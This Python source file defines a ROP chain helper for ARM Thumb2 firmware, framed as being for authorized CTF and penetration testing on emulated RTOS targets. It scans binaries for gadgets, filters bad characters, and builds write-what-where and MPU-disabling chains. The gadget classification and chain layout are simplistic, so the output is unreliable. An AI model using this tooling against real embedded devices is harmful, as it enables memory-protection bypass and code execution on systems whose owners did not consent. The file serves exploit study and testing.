"""
Pure-Python ROP (Return-Oriented Programming) chain helper.

Provides gadget scanning, filtering, and chain construction for authorized
CTF competitions and penetration testing against QEMU-emulated embedded
RTOS targets.
"""

from __future__ import annotations

import struct
from typing import Optional


class ROPHelper:
    """
    Pure-Python ROP chain helper for security research.

    Scans raw binary images for Thumb2 gadgets, filters out gadgets
    whose addresses contain bad characters, and assembles chain payloads.
    """

    # -------------------------------------------------------------------------
    # Gadget discovery
    # -------------------------------------------------------------------------

    def find_bxlr_gadgets(self, binary: bytes, load_addr: int) -> list[dict]:
        """
        Scan `binary` for ARM Thumb2 ``BX LR`` (0x70 0x47) gadgets.

        Parameters
        ----------
        binary:
            Raw binary image bytes.
        load_addr:
            Virtual address where the binary is loaded.

        Returns
        -------
        list[dict]
            Each dict has keys:
            ``address`` (int), ``bytes`` (bytes), ``type`` (str),
            ``description`` (str), ``stack_delta`` (int).
        """
        gadgets = []
        length = len(binary)

        if length < 2:
            return gadgets

        # Scan at 2-byte aligned offsets (Thumb2 instructions are halfword-aligned).
        offset = 0
        while offset + 1 < length:
            b0 = binary[offset]
            b1 = binary[offset + 1]

            if b0 == 0x70 and b1 == 0x47:
                # BX LR found.
                gadget_addr = load_addr + offset

                # Capture up to 16 bytes of body before the terminator.
                start = max(0, offset - 16) & ~1
                body = binary[start:offset]
                raw = binary[start:offset + 2]

                gadgets.append({
                    "address": gadget_addr,
                    "bytes": raw,
                    "type": self._classify_body(body),
                    "description": f"BX LR @ 0x{gadget_addr:08X}",
                    "stack_delta": 4,
                })

            elif b1 == 0xBD:
                # POP {Rlist, PC} — Thumb T1 POP with PC bit set.
                gadget_addr = load_addr + offset

                start = max(0, offset - 16) & ~1
                body = binary[start:offset]
                raw = binary[start:offset + 2]

                reg_list = b0
                pop_count = bin(reg_list).count("1") + 1  # +1 for PC
                stack_delta = pop_count * 4

                gadgets.append({
                    "address": gadget_addr,
                    "bytes": raw,
                    "type": "RegisterControl",
                    "description": f"POP {{Rlist=0x{reg_list:02X}, PC}} @ 0x{gadget_addr:08X}",
                    "stack_delta": stack_delta,
                })

            offset += 2

        return gadgets

    def _classify_body(self, body: bytes) -> str:
        """Classify a gadget body (bytes before terminator) heuristically."""
        if not body:
            return "Unknown"

        i = 0
        while i + 1 < len(body):
            hi = body[i + 1]

            if hi & 0xF8 == 0x60:
                return "MemoryWrite"
            if hi & 0xF8 == 0x68:
                return "MemoryRead"
            if hi & 0xFC == 0x18 or hi & 0xC0 == 0x30:
                return "Arithmetic"
            if hi in (0xF3, 0xBF):
                return "System"
            if hi & 0xFE == 0xBC:
                return "RegisterControl"

            i += 2

        return "Unknown"

    # -------------------------------------------------------------------------
    # Gadget filtering
    # -------------------------------------------------------------------------

    def filter_bad_chars(
        self, gadgets: list[dict], bad_chars: bytes
    ) -> list[dict]:
        """
        Remove gadgets whose address contains any byte in `bad_chars`.

        Parameters
        ----------
        gadgets:
            List of gadget dicts (as returned by :meth:`find_bxlr_gadgets`).
        bad_chars:
            Bytes that must not appear in any gadget address.

        Returns
        -------
        list[dict]
            Filtered gadget list.
        """
        if not bad_chars:
            return list(gadgets)

        result = []
        for g in gadgets:
            addr_bytes = struct.pack("<I", g["address"])
            if not any(b in bad_chars for b in addr_bytes):
                result.append(g)
        return result

    # -------------------------------------------------------------------------
    # Chain construction
    # -------------------------------------------------------------------------

    def build_write_what_where(
        self,
        gadgets: list[dict],
        addr: int,
        value: int,
    ) -> bytes:
        """
        Build a minimal ROP chain to write ``value`` to ``addr``.

        Searches `gadgets` for a ``MemoryWrite`` gadget and constructs
        the stack layout::

            [gadget_address LE32][value LE32][addr LE32]

        Parameters
        ----------
        gadgets:
            Gadget dicts from :meth:`find_bxlr_gadgets` (filtered).
        addr:
            Target address to write to.
        value:
            32-bit value to write.

        Returns
        -------
        bytes
            Chain bytes, or empty bytes if no suitable gadget found.
        """
        # Find a MemoryWrite gadget.
        write_gadget = None
        for g in gadgets:
            if g.get("type") == "MemoryWrite":
                write_gadget = g
                break

        if write_gadget is None:
            return b""

        chain = struct.pack("<I", write_gadget["address"])
        chain += struct.pack("<I", value)
        chain += struct.pack("<I", addr)
        return chain

    def build_mpu_disable(self, gadgets: list[dict]) -> bytes:
        """
        Build a ROP chain to disable the ARM Cortex-M MPU.

        Equivalent to writing 0 to MPU_CTRL (0xE000ED94).

        Parameters
        ----------
        gadgets:
            Available gadgets.

        Returns
        -------
        bytes
        """
        return self.build_write_what_where(gadgets, 0xE000_ED94, 0)

    def check_chain(self, chain: bytes, bad_chars: bytes) -> bool:
        """
        Return ``True`` if no byte in `chain` appears in `bad_chars`.

        Parameters
        ----------
        chain:
            ROP chain bytes.
        bad_chars:
            Disallowed bytes.
        """
        if not bad_chars:
            return True
        return not any(b in bad_chars for b in chain)
